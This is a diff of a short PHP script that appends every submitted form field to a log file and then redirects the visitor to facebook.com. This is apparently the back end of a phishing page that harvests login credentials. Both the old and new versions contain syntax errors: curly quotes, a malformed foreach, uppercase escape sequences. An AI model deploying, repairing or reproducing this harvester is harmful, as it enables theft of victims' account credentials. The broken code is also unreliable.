@@ -1,13 +1,15 @@
-<?PHP
-HEADER('LOCATION:HTTP://WWW.GOOGLE/');
-$HANDLE=FOPEN("USERNAMES.TXT","A");
-FOREACH($_POST AS $VARIABLE =>$VALUE){
-FWRITE($HANDLE,$VARIABLE);
-FWRITE($HANDLE,"=");
-FWRITE($HANDLE,$VALUE);
-FWRITE($HANDLE,"\R\N");
+<?php
+header(‘Location: https://www.facebook.com/');
+$handle = fopen(“log.txt”, “a”);
+foreach($_POST as $variable = $value)
+{
+fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “\r\n”);
 }
-FWRITE($HANDLE,"\R\N");
-FCLOSE($HANDLE);
-EXIT;
+fwrite($handle, “\r\n”);
+fclose($handle);
+exit;
 ?>
+
